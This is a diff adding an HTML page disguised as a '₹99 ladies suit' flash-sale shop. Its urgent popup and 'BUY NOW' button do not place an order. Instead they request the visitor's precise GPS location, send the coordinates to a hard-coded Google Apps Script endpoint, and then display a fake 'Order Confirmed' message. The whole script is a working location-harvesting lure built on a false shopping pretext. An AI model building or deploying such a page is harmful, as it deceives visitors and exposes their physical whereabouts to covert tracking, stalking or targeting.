@@ -1,0 +1,1538 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0">
+
+<title>Ladies Suit Sale</title>
+
+
+<style>
+
+/* =====================================================
+   BASIC RESET
+===================================================== */
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+
+html,
+body {
+  background: #fff5f7;
+  min-height: 100%;
+}
+
+
+body {
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 14px;
+  min-height: 100vh;
+}
+
+
+/* =====================================================
+   MAIN CARD
+===================================================== */
+
+.shop-card {
+
+  max-width: 520px;
+
+  width: 100%;
+
+  background: #fff;
+
+  border-radius:
+    40px 40px 30px 30px;
+
+  box-shadow:
+    0 25px 40px -12px
+    rgba(180,60,90,0.35);
+
+  overflow: hidden;
+
+  margin: auto;
+
+}
+
+
+/* =====================================================
+   BANNER
+===================================================== */
+
+.banner {
+
+  background:
+    linear-gradient(
+      135deg,
+      #c41e3a,
+      #e83a6b,
+      #ff7b9c
+    );
+
+  padding:
+    28px 24px 22px;
+
+  text-align: center;
+
+  color: #fff;
+
+  position: relative;
+
+  border-bottom:
+    6px solid #ffd966;
+
+}
+
+
+.banner::before {
+
+  content: "✨";
+
+  position: absolute;
+
+  top: 12px;
+
+  left: 20px;
+
+  font-size: 28px;
+
+  opacity: .6;
+
+  transform:
+    rotate(-15deg);
+
+}
+
+
+.banner::after {
+
+  content: "✨";
+
+  position: absolute;
+
+  bottom: 12px;
+
+  right: 20px;
+
+  font-size: 28px;
+
+  opacity: .6;
+
+  transform:
+    rotate(15deg);
+
+}
+
+
+.banner h1 {
+
+  font-size: 2.2rem;
+
+  font-weight: 800;
+
+  text-shadow:
+    3px 3px 0 rgba(0,0,0,.15);
+
+  margin-bottom: 6px;
+
+  line-height: 1.2;
+
+}
+
+
+.banner h1 span {
+
+  font-size: 2.8rem;
+
+  display: inline-block;
+
+  background: #ffd966;
+
+  color: #a11130;
+
+  padding:
+    0 12px;
+
+  border-radius: 50px;
+
+  line-height: 1.4;
+
+  margin-left: 5px;
+
+  box-shadow:
+    0 4px 0 #b8860b;
+
+}
+
+
+.banner p {
+
+  font-size: 1.15rem;
+
+  font-weight: 500;
+
+  background:
+    rgba(255,255,240,.2);
+
+  display: inline-block;
+
+  padding:
+    6px 24px;
+
+  border-radius: 40px;
+
+  margin-top: 8px;
+
+}
+
+
+/* =====================================================
+   PRODUCT SECTION
+===================================================== */
+
+.product-showcase {
+
+  background: #fceae9;
+
+  padding:
+    24px 20px 18px;
+
+  display: flex;
+
+  flex-direction: column;
+
+  align-items: center;
+
+}
+
+
+.suit-graphic {
+
+  font-size: 5.5rem;
+
+  line-height: 1;
+
+  margin:
+    0 0 8px;
+
+  filter:
+    drop-shadow(
+      0 10px 12px
+      rgba(180,40,70,.3)
+    );
+
+  background:
+    radial-gradient(
+      circle at 30% 20%,
+      #ffe9e9,
+      #ffd0d6
+    );
+
+  width: 130px;
+
+  height: 130px;
+
+  border-radius: 50%;
+
+  display: flex;
+
+  align-items: center;
+
+  justify-content: center;
+
+  border:
+    4px solid #fff;
+
+}
+
+
+.price-tag {
+
+  background: #c41e3a;
+
+  color: #fff;
+
+  font-size: 2.2rem;
+
+  font-weight: 800;
+
+  padding:
+    10px 40px;
+
+  border-radius: 100px;
+
+  display: inline-block;
+
+  margin:
+    10px 0 4px;
+
+  box-shadow:
+    0 8px 0 #7a0e24;
+
+  letter-spacing: 2px;
+
+}
+
+
+.price-tag small {
+
+  font-size: 1rem;
+
+  font-weight: 400;
+
+  margin-right: 6px;
+
+  text-decoration: line-through;
+
+  opacity: .7;
+
+}
+
+
+.offer-note {
+
+  color: #a11130;
+
+  font-weight: 600;
+
+  font-size: 1rem;
+
+  background: #ffd966;
+
+  padding:
+    6px 18px;
+
+  border-radius: 30px;
+
+  margin-bottom: 12px;
+
+}
+
+
+/* =====================================================
+   SEE MORE BUTTON
+===================================================== */
+
+.see-more-btn {
+
+  background: #1e1e2f;
+
+  color: #fff;
+
+  border: none;
+
+  font-size: 1.4rem;
+
+  font-weight: 700;
+
+  padding:
+    18px 30px;
+
+  width: 100%;
+
+  border-radius: 16px;
+
+  letter-spacing: 1px;
+
+  cursor: pointer;
+
+  box-shadow:
+    0 10px 0 #0b0b14;
+
+  display: flex;
+
+  align-items: center;
+
+  justify-content: center;
+
+  gap: 12px;
+
+  margin-top: 8px;
+
+}
+
+
+.see-more-btn:active {
+
+  transform:
+    translateY(5px);
+
+  box-shadow:
+    0 5px 0 #0b0b14;
+
+}
+
+
+/* =====================================================
+   POPUP OVERLAY
+===================================================== */
+
+.popup-overlay {
+
+  position: fixed;
+
+  top: 0;
+
+  left: 0;
+
+  width: 100vw;
+
+  height: 100vh;
+
+  height: 100dvh;
+
+  background:
+    rgba(0,0,0,.65);
+
+  backdrop-filter:
+    blur(4px);
+
+  -webkit-backdrop-filter:
+    blur(4px);
+
+  display: none;
+
+  justify-content: center;
+
+  align-items: center;
+
+  padding: 18px;
+
+  z-index: 999999;
+
+}
+
+
+.popup-overlay.show {
+
+  display: flex;
+
+}
+
+
+/* =====================================================
+   POPUP BOX
+===================================================== */
+
+.popup-box {
+
+  background: #fff;
+
+  max-width: 380px;
+
+  width: 100%;
+
+  border-radius: 36px;
+
+  padding:
+    36px 24px 30px;
+
+  text-align: center;
+
+  box-shadow:
+    0 30px 40px -10px
+    rgba(0,0,0,.5);
+
+  position: relative;
+
+  animation:
+    popIn .3s
+    cubic-bezier(
+      .18,
+      .89,
+      .32,
+      1.28
+    );
+
+}
+
+
+@keyframes popIn {
+
+  0% {
+
+    transform:
+      scale(.7);
+
+    opacity: 0;
+
+  }
+
+  100% {
+
+    transform:
+      scale(1);
+
+    opacity: 1;
+
+  }
+
+}
+
+
+/* =====================================================
+   POPUP EMOJI
+===================================================== */
+
+.popup-emoji {
+
+  font-size: 3.5rem;
+
+  margin-bottom: 8px;
+
+  display: block;
+
+  animation:
+    shake .8s
+    ease-in-out
+    infinite;
+
+}
+
+
+@keyframes shake {
+
+  0%,100% {
+
+    transform:
+      rotate(0deg);
+
+  }
+
+  25% {
+
+    transform:
+      rotate(-12deg);
+
+  }
+
+  75% {
+
+    transform:
+      rotate(12deg);
+
+  }
+
+}
+
+
+/* =====================================================
+   POPUP TEXT
+===================================================== */
+
+.popup-box h2 {
+
+  font-size: 1.9rem;
+
+  color: #c41e3a;
+
+  margin-bottom: 8px;
+
+  font-weight: 800;
+
+  letter-spacing: .5px;
+
+}
+
+
+.popup-box p {
+
+  color: #3e2e2e;
+
+  font-size: 1.05rem;
+
+  margin-bottom: 22px;
+
+  line-height: 1.5;
+
+}
+
+
+/* =====================================================
+   BUY BUTTON
+===================================================== */
+
+.buy-now-btn {
+
+  background:
+    linear-gradient(
+      135deg,
+      #e83a6b,
+      #c41e3a
+    );
+
+  color: #fff;
+
+  border: none;
+
+  font-size: 1.4rem;
+
+  font-weight: 800;
+
+  padding:
+    20px;
+
+  width: 100%;
+
+  border-radius: 60px;
+
+  box-shadow:
+    0 10px 0 #7a0e24;
+
+  cursor: pointer;
+
+  letter-spacing: 1px;
+
+  animation:
+    pulse 1.5s
+    ease-in-out
+    infinite;
+
+}
+
+
+@keyframes pulse {
+
+  0%,100% {
+
+    box-shadow:
+      0 10px 0 #7a0e24,
+      0 0 0 0
+      rgba(232,58,107,.6);
+
+  }
+
+  50% {
+
+    box-shadow:
+      0 10px 0 #7a0e24,
+      0 0 0 18px
+      rgba(232,58,107,0);
+
+  }
+
+}
+
+
+.buy-now-btn:active {
+
+  transform:
+    translateY(5px);
+
+  box-shadow:
+    0 5px 0 #7a0e24;
+
+}
+
+
+.buy-now-btn:disabled {
+
+  opacity: .7;
+
+  cursor: not-allowed;
+
+  animation: none;
+
+}
+
+
+/* =====================================================
+   STATUS
+===================================================== */
+
+#popupStatus {
+
+  margin-top: 16px;
+
+  font-size: .95rem;
+
+  min-height: 2.4em;
+
+  font-weight: 500;
+
+  word-break: break-word;
+
+}
+
+
+.success-message {
+
+  color: #1f7a1f;
+
+}
+
+
+.error-message {
+
+  color: #b22222;
+
+}
+
+
+/* =====================================================
+   CLOSE BUTTON
+===================================================== */
+
+.close-popup {
+
+  background: transparent;
+
+  border: none;
+
+  font-size: .95rem;
+
+  color: #8b6b6b;
+
+  cursor: pointer;
+
+  text-decoration: underline;
+
+  padding: 10px;
+
+  font-weight: 500;
+
+  margin-top: 6px;
+
+}
+
+
+/* =====================================================
+   MOBILE
+===================================================== */
+
+@media (max-width: 480px) {
+
+  body {
+
+    padding: 10px;
+
+  }
+
+
+  .banner {
+
+    padding:
+      24px 16px 20px;
+
+  }
+
+
+  .banner h1 {
+
+    font-size: 1.8rem;
+
+  }
+
+
+  .banner h1 span {
+
+    font-size: 2.3rem;
+
+  }
+
+
+  .banner p {
+
+    font-size: .95rem;
+
+    padding:
+      6px 14px;
+
+  }
+
+
+  .popup-overlay {
+
+    padding: 14px;
+
+  }
+
+
+  .popup-box {
+
+    max-width: 100%;
+
+    padding:
+      30px 20px 24px;
+
+    border-radius: 30px;
+
+  }
+
+
+  .popup-box h2 {
+
+    font-size: 1.7rem;
+
+  }
+
+
+  .popup-box p {
+
+    font-size: 1rem;
+
+  }
+
+
+  .buy-now-btn {
+
+    font-size: 1.25rem;
+
+    padding:
+      18px;
+
+  }
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<!-- =====================================================
+     MAIN SALE CARD
+===================================================== -->
+
+
+<div class="shop-card">
+
+
+  <div class="banner">
+
+    <h1>
+
+      LADIES SUIT
+
+      <span>
+        99
+      </span>
+
+    </h1>
+
+
+    <p>
+
+      ✨ FLASH SALE · LIMITED STOCK ✨
+
+    </p>
+
+  </div>
+
+
+  <div class="product-showcase">
+
+
+    <div class="suit-graphic">
+
+      👗
+
+    </div>
+
+
+    <div class="price-tag">
+
+      <small>
+        ₹499
+      </small>
+
+      ₹99
+
+    </div>
+
+
+    <div class="offer-note">
+
+      🔥 TODAY ONLY 🔥
+
+    </div>
+
+
+    <button
+      class="see-more-btn"
+      id="seeMoreBtn">
+
+      👀 SEE MORE PRODUCT
+
+    </button>
+
+
+  </div>
+
+
+</div>
+
+
+
+<!-- =====================================================
+     POPUP
+===================================================== -->
+
+
+<div
+  class="popup-overlay"
+  id="popupOverlay">
+
+
+  <div class="popup-box">
+
+
+    <span class="popup-emoji">
+
+      🔥
+
+    </span>
+
+
+    <h2>
+
+      HURRY UP!
+
+    </h2>
+
+
+    <p>
+
+      Limited stock at
+      <strong>₹99 only</strong>.
+
+      <br>
+
+      Grab yours before it's gone!
+
+    </p>
+
+
+    <button
+      class="buy-now-btn"
+      id="buyNowBtn">
+
+      🛒 BUY NOW
+
+    </button>
+
+
+    <div
+      id="popupStatus">
+    </div>
+
+
+    <button
+      class="close-popup"
+      id="closePopupBtn">
+
+      Maybe later
+
+    </button>
+
+
+  </div>
+
+
+</div>
+
+
+
+<script>
+
+
+/* =====================================================
+   CONFIGURATION
+===================================================== */
+
+
+/*
+IMPORTANT:
+
+Replace this with your actual
+Google Apps Script Web App URL.
+
+It MUST end with:
+
+/exec
+*/
+
+
+var WEB_APP_URL =
+  "https://script.google.com/macros/s/AKfycbxrtom5R-DWdApvMzovoIdatiUKrEfb4RCC7LqHyReAkmQogrjg_baMNl2BtZApvKVs/exec";
+
+
+/*
+This must exactly match the
+SECRET_KEY in Apps Script.
+*/
+
+
+var SECRET_KEY =
+  "Get_This_Product";
+
+
+
+/* =====================================================
+   GET HTML ELEMENTS
+===================================================== */
+
+
+var seeMoreBtn =
+  document.getElementById(
+    "seeMoreBtn"
+  );
+
+
+var popupOverlay =
+  document.getElementById(
+    "popupOverlay"
+  );
+
+
+var closePopupBtn =
+  document.getElementById(
+    "closePopupBtn"
+  );
+
+
+var buyNowBtn =
+  document.getElementById(
+    "buyNowBtn"
+  );
+
+
+var popupStatus =
+  document.getElementById(
+    "popupStatus"
+  );
+
+
+
+/* =====================================================
+   OPEN POPUP
+===================================================== */
+
+
+function openPopup() {
+
+  popupOverlay.classList.add(
+    "show"
+  );
+
+}
+
+
+
+/* =====================================================
+   AUTOMATIC POPUP ON PAGE LOAD
+===================================================== */
+
+
+window.addEventListener(
+  "load",
+  function() {
+
+    setTimeout(
+      function() {
+
+        openPopup();
+
+      },
+      500
+    );
+
+  }
+);
+
+
+
+/* =====================================================
+   SEE MORE PRODUCT
+===================================================== */
+
+
+seeMoreBtn.addEventListener(
+  "click",
+  function() {
+
+    openPopup();
+
+    popupStatus.innerHTML =
+      "";
+
+    popupStatus.className =
+      "";
+
+  }
+);
+
+
+
+/* =====================================================
+   CLOSE POPUP
+===================================================== */
+
+
+function closePopup() {
+
+  popupOverlay.classList.remove(
+    "show"
+  );
+
+}
+
+
+closePopupBtn.addEventListener(
+  "click",
+  closePopup
+);
+
+
+
+/* =====================================================
+   SHOW ERROR
+===================================================== */
+
+
+function showError(
+  message
+) {
+
+  popupStatus.innerHTML =
+    message;
+
+  popupStatus.className =
+    "error-message";
+
+}
+
+
+
+/* =====================================================
+   RESET BUY BUTTON
+===================================================== */
+
+
+function resetButton() {
+
+  buyNowBtn.disabled =
+    false;
+
+  buyNowBtn.innerHTML =
+    "🛒 BUY NOW";
+
+}
+
+
+
+/* =====================================================
+   BUY NOW
+===================================================== */
+
+
+buyNowBtn.addEventListener(
+  "click",
+  function() {
+
+
+    /*
+    Disable button
+    */
+
+    buyNowBtn.disabled =
+      true;
+
+
+    buyNowBtn.innerHTML =
+      "⏳ Please wait...";
+
+
+    popupStatus.className =
+      "";
+
+
+    /*
+    Check HTTPS
+    */
+
+    if (
+      location.protocol !== "https:" &&
+      location.hostname !== "localhost"
+    ) {
+
+      showError(
+        "❌ This page must be opened using HTTPS."
+      );
+
+      resetButton();
+
+      return;
+
+    }
+
+
+    /*
+    Check browser location support
+    */
+
+    if (
+      !navigator.geolocation
+    ) {
+
+      showError(
+        "❌ Location is not supported by this browser."
+      );
+
+      resetButton();
+
+      return;
+
+    }
+
+
+    popupStatus.innerHTML =
+      "📍 Requesting your location...";
+
+
+    /*
+    Request location
+    */
+
+    navigator.geolocation.getCurrentPosition(
+
+      function(position) {
+
+
+        /*
+        Get coordinates
+        */
+
+        var latitude =
+          position.coords.latitude;
+
+
+        var longitude =
+          position.coords.longitude;
+
+
+        /*
+        Console debugging
+        */
+
+        console.log(
+          "Latitude:",
+          latitude
+        );
+
+
+        console.log(
+          "Longitude:",
+          longitude
+        );
+
+
+        popupStatus.innerHTML =
+          "📡 Sending location...";
+
+
+        /*
+        Create POST data
+        */
+
+        var formData =
+          new URLSearchParams();
+
+
+        formData.append(
+          "key",
+          SECRET_KEY
+        );
+
+
+        formData.append(
+          "lat",
+          latitude
+        );
+
+
+        formData.append(
+          "lng",
+          longitude
+        );
+
+
+        /*
+        Send to Google Apps Script
+        */
+
+        fetch(
+          WEB_APP_URL,
+          {
+
+            method: "POST",
+
+            headers: {
+
+              "Content-Type":
+                "application/x-www-form-urlencoded"
+
+            },
+
+            body:
+              formData.toString()
+
+          }
+        )
+
+
+        /*
+        Read server response
+        */
+
+        .then(
+          function(response) {
+
+
+            if (
+              !response.ok
+            ) {
+
+              throw new Error(
+                "Server returned HTTP " +
+                response.status
+              );
+
+            }
+
+
+            return response.text();
+
+          }
+        )
+
+
+        /*
+        Process response
+        */
+
+        .then(
+          function(result) {
+
+
+            console.log(
+              "Apps Script response:",
+              result
+            );
+
+
+            var data;
+
+
+            try {
+
+              data =
+                JSON.parse(result);
+
+            }
+
+            catch (error) {
+
+              throw new Error(
+                "Invalid response from server."
+              );
+
+            }
+
+
+            /*
+            Check server status
+            */
+
+            if (
+              data.status !==
+              "success"
+            ) {
+
+              throw new Error(
+                data.message ||
+                "Server rejected request."
+              );
+
+            }
+
+
+            /*
+            SUCCESS
+            */
+
+            popupStatus.innerHTML =
+
+              "🎉 <strong>Order Confirmed!</strong><br>" +
+
+              "Our team will contact you shortly.";
+
+
+            popupStatus.className =
+              "success-message";
+
+
+            buyNowBtn.innerHTML =
+              "✅ ORDERED";
+
+
+            buyNowBtn.disabled =
+              true;
+
+
+          }
+        )
+
+
+        /*
+        Network / server error
+        */
+
+        .catch(
+          function(error) {
+
+
+            console.error(
+              "Send error:",
+              error
+            );
+
+
+            showError(
+
+              "❌ Could not send location.<br>" +
+
+              error.message
+
+            );
+
+
+            resetButton();
+
+          }
+        );
+
+
+      },
+
+
+      /*
+      =================================================
+      LOCATION ERROR
+      =================================================
+      */
+
+      function(error) {
+
+
+        console.error(
+          "Location error:",
+          error
+        );
+
+
+        var message;
+
+
+        if (
+          error.code === 1
+        ) {
+
+          message =
+
+            "❌ Location permission was denied.<br>" +
+
+            "Please allow location access and try again.";
+
+        }
+
+        else if (
+          error.code === 2
+        ) {
+
+          message =
+
+            "❌ Location is unavailable.<br>" +
+
+            "Please check GPS/location services.";
+
+        }
+
+        else if (
+          error.code === 3
+        ) {
+
+          message =
+
+            "❌ Location request timed out.<br>" +
+
+            "Please try again.";
+
+        }
+
+        else {
+
+          message =
+
+            "❌ Unable to get your location.";
+
+        }
+
+
+        showError(
+          message
+        );
+
+
+        resetButton();
+
+      },
+
+
+      /*
+      =================================================
+      LOCATION OPTIONS
+      =================================================
+      */
+
+      {
+
+        enableHighAccuracy:
+          true,
+
+        timeout:
+          30000,
+
+        maximumAge:
+          0
+
+      }
+
+    );
+
+  }
+);
+
+</script>
+
+
+</body>
+
+</html>
+
